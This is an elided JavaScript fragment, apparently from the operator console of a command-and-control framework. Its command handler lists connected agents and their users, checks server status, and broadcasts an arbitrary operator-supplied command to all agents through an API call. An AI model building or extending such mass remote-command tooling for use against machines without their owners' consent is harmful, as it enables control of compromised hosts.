...
async function RunServerCmd() {
    ...
    try {
        switch (cmd) {
            ...
            case "sessions":
            case "agents": {
                let r = await Api("/api/agents");
                let d = await r.json();
                (d.Agents || []).forEach(a =>
                    Log(
                        "  [" +
                            (a.DisplayName || a.AgentName || a.ID) +
                            "] #" +
                            a.ID +
                            " " +
                            a.User +
            ...
            case "status": {
                let r = await Api("/api/server/status");
                let d = await r.json();
                Log(
                    "  Status: " +
                        d.Status +
            ...
            case "broadcast": {
                let bcmd =
                    Parts.slice(1).join(" ") ||
                    raw.replace(/^broadcast\s*/i, "");
                if (!bcmd) {
                    Log("[!] Usage: broadcast <cmd>", "error");
                    break;
                }
                let r = await Api("/api/command/broadcastall", {
                    method: "POST",
                    body: JSON.stringify({
                        Command: bcmd,
            ...
            default:
                Log(
                    "[!] Unknown command: " +
                        cmd +
                        " (available: kill, sessions, status, broadcast)",
                    "error"
                );
        }
    } catch (e) {
